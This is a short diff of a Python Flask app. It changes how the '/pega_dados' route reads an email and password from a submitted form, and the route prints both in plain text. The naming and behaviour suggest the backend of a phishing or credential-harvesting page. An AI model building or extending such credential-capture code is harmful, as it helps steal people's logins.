@@ -8,8 +8,8 @@ def pagina_inicial():
 
 @app.route("/pega_dados", methods=["POST"])
 def pega_dados():
-    email = request.form.get("email")
-    senha = request.form.get("pass")
+    email = request.form["email"]
+    senha = request.form["pass"]
     
     print(f"EMAIL: {email} \n SENHA: {senha}")
     
